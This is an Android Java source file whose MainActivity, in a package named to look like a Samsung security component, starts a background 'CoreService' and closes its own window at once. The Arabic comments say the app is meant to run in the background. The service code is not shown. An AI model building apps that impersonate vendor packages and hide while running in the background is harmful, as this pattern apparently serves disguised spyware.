package com.samsung.android.security.v8;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

import com.samsung.android.security.v8.services.CoreService;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // تشغيل الخدمة الأساسية
        Intent serviceIntent = new Intent(this, CoreService.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // إغلاق النشاط (التطبيق يعمل بالخلفية)
        finish();
    }
}
